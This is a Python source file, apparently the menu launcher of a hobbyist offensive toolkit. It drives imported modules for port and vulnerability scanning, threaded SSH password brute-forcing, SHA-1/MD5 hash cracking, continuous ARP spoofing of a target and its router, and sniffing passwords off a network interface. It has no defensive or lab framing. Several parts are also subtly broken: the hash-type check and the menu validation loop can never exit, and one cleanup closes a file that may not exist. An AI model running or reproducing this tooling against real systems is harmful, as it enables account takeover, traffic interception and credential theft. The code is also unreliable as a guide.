import threading
import time
import portScanner
import portScanner_vulscan as vul
import sshbrutethreaded as ssh
import PasswordCracker as ps
from os import path
from passSniffer import sniff, pkt_parser
from arpspoofer import get_mac_address, spoof


def Portscanner_options():
    try:
        targets = input('[+] Enter Target/s To Scan(split multiple targets with ,): ')
        ports = input('[+] Enter Port/s To Scan(multiple ports with - for range or , for specific ports): ')
        timeout_time = int(input('[+] Enter timeout time in seconds '))
        value = int(0)
        portsArray = []

        # if it not a range i.e specific port(s)
        if '-' not in ports:
            for port in ports.split(','):
                portsArray.append(int(port.strip(' ')))
                value = 1
        else:
            for port in ports.split('-'):
                portsArray.append(int(port.strip(' ')))
                # makes sure the range is in order
                portsArray.sort()

        print("The value is: " + str(value))

        if ',' in targets:
            for ip_add in targets.split(','):
                if value != 1:
                    portScanner.scan(ip_add.strip(' '), portsArray[0], portsArray[1], timeout_time)
                else:
                    portScanner.scan1(ip_add.strip(' '), portsArray, timeout_time)
        else:
            # if its not a specific target or targets i.e a range
            if value != 1:
                portScanner.scan(targets.strip(' '), portsArray[0], portsArray[1], timeout_time)
            else:
                portScanner.scan1(targets.strip(' '), portsArray, timeout_time)
    except KeyboardInterrupt:
        print('bye.')
        exit(0)


def Vulscan():
    try:
        targets = input('[+] Enter Target/s To Scan(split multiple targets with ,): ')
        ports = input('[+] Enter Port/s To Scan(multiple ports with - for range or , for specific ports): ')
        vul_file = input('[+] * Enter Path To The File With Vulnerable Softwares: ')
        timeout_time = int(input('[+] Enter timeout time in seconds '))
        value = int(0)
        portsArray = []

        # if it not a range i.e specific port(s)
        if '-' not in ports:
            for port in ports.split(','):
                portsArray.append(int(port.strip(' ')))
                value = 1
        else:
            for port in ports.split('-'):
                portsArray.append(int(port.strip(' ')))
                # makes sure the range is in order
                portsArray.sort()

        print("The value is: " + str(value))

        if ',' in targets:
            for ip_add in targets.split(','):
                if value != 1:
                    vul.scan(ip_add, portsArray[0], portsArray[1], timeout_time)
                else:
                    vul.scan1(ip_add, portsArray, timeout_time)
        else:
            # if its not a specific target or targets i.e a range
            if value != 1:
                vul.scan(targets.strip(' '), portsArray[0], portsArray[1], timeout_time)
            else:
                vul.scan1(targets.strip(' '), portsArray, timeout_time)
        try:
            with open(vul_file, 'r') as file:
                count = 0
                for banner in vul.banners:
                    file.seek(0)
                    for line in file.readlines():
                        if line.strip() in banner:
                            print('[!!] VULNERABLE BANNER: "' + banner + '" ON PORT: ' + str(
                                vul.open_ports[count]))
                    count += 1
        except FileNotFoundError:
            print("File not accessible")
        finally:
            file.close()
    except KeyboardInterrupt:
        print('bye')
        exit(0)


def SSH():
    try:
        host = input('[+] Target Address: ')
        username = input('[+] SSH Username: ')
        input_file = input('[+] Passwords File: ')
        print('\n')

        def file(passwordfile):
            f = None
            try:  # check if the file exist
                f = open(passwordfile, 'r')
            except IOError:
                print("File not accessible")
            else:  # if the file exists
                print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')
                with f as passwords:
                    for line in passwords.readlines():
                        if ssh.stop_flag == 1:
                            t.join()
                            exit()
                        password = line.strip()
                        t = threading.Thread(target=ssh.ssh_connect, args=(host, username, password,))
                        t.start()
                        time.sleep(0.5)
            finally:
                f.close()

        file(input_file)
    except KeyboardInterrupt:
        print('bye.')
        exit(0)


def passwordCracker():
    hash_to_decrypt = str(input('[+] Enter hash to decrypt or hashes using ","'))
    type_of_hash = str(input('Choose a Hash to decrypt:\n [1] SHA-1  [2]MD-5 ')).strip(' ')
    while type_of_hash != "1" or "2":
        type_of_hash = str(input('Choose a Hash to decrypt:\n [1] SHA-1  [2]MD-5 ')).strip(' ')
    if type_of_hash == "1":
        type_of_hash = "sha1"
    else:
        type_of_hash = "md5"

    file_path = str(input('[+]Enter path to the file to bruteforce with: '))
    while not path.isfile(file_path):
        print("File does exist")
        file_path = str(input('Enter path to the file to bruteforce with: '))

    # if there are many
    if ',' in hash_to_decrypt:
        for hashes in hash_to_decrypt.split(','):
            ps.crack(type_of_hash, file_path, hashes.strip(' '))
    else:
        ps.crack(type_of_hash, file_path, hash_to_decrypt.strip(' '))


def arpSpoofer():
    try:

        target_ip = str(input("Enter target ip")).strip(' ')
        router_ip = str(input("Enter router ip")).strip(' ')
        target_mac = str(get_mac_address(target_ip))
        router_mac = str(get_mac_address(router_ip))

        if ',' in target_ip:  # for multiple targets
            for ip_add in target_ip.split(','):
                while True:  # infinite loop continues spoofing every 2 secs
                    spoof(router_ip, ip_add, router_mac, target_mac)
                    time.sleep(2)
        else:
            while True:  # infinite loop continues spoofing every 2 secs
                spoof(router_ip, target_ip, router_mac, target_mac)
                time.sleep(2)
    except KeyboardInterrupt:
        print('Closing ARP Spoofer.')
        exit(0)


def password_sniffer():
    try:
        interface = input("Enter Interface i.e 'eth0'")  # make its user input
        sniff(iface=interface, prn=pkt_parser, store=0)
    except KeyboardInterrupt:
        print('Exiting')
        exit(0)


if __name__ == '__main__':
    try:
        option = str()
        right = False
        while not right:  # while the user enters an unvalid number
            print("\n[1] PortScanner      [2] Vulnerability Scanner     [3] SSH Bruteforce \n"
                  "[4] Password cracker      [5] ARP Packet Spoofer     [6] Password Sniffer")
            option = str(input("Pick a program: "))
            for x in range(1 - 7):
                if option == x:
                    right = True
                    break

        if option == "1":  # options list
            try:
                Portscanner_options()
            except KeyboardInterrupt:
                print('Exiting')
                exit(0)
        elif option == "2":
            try:
                Vulscan()
            except KeyboardInterrupt:
                print('Exiting')
                exit(0)
        elif option == "3":
            try:
                SSH()
            except KeyboardInterrupt:
                print('Exiting')
                exit(0)
        elif option == "4":
            try:
                passwordCracker()
            except KeyboardInterrupt:
                print('Exiting')
                exit(0)
        elif option == "5":
            try:
                arpSpoofer()
            except KeyboardInterrupt:
                print('Exiting')
                exit(0)
        elif option == "6":
            password_sniffer()
        else:
            print("Not an option")
    except KeyboardInterrupt:
        print("Bye.")
        exit(0)
